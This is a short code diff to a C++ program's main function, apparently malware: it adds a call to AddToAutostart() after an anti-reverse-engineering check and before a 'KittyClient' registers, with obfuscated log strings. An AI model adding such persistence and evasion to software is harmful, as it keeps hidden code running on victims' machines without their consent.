@@ -12,6 +12,8 @@ int main()
 	if (ShouldQuit())
 		KittyLog(OBFUSCATED("Reversing detected"), false);
 
+	AddToAutostart();
+
 	KittyClient client = KittyClient();
 	if (!client.Register())
 		KittyLog(OBFUSCATED("Unable to register"), true);
